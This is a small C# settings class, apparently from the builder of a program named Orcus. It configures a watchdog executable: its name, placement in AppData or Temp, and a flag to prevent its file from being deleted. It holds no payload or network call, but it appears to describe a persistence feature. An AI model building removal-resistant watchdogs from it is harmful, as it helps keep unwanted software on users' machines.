using System;
using Orcus.Shared.Core;

namespace Orcus.Shared.Settings
{
    [Serializable]
    public class WatchdogBuilderProperty : IBuilderProperty
    {
        public bool IsEnabled { get; set; }
        public string Name { get; set; } = "OrcusWatchdog.exe";
        public WatchdogLocation WatchdogLocation { get; set; }
        public bool PreventFileDeletion { get; set; }

        public IBuilderProperty Clone()
        {
            return new WatchdogBuilderProperty
            {
                IsEnabled = IsEnabled,
                Name = Name,
                WatchdogLocation = WatchdogLocation,
                PreventFileDeletion = PreventFileDeletion
            };
        }
    }

    public enum WatchdogLocation
    {
        AppData,
        Temp
    }
}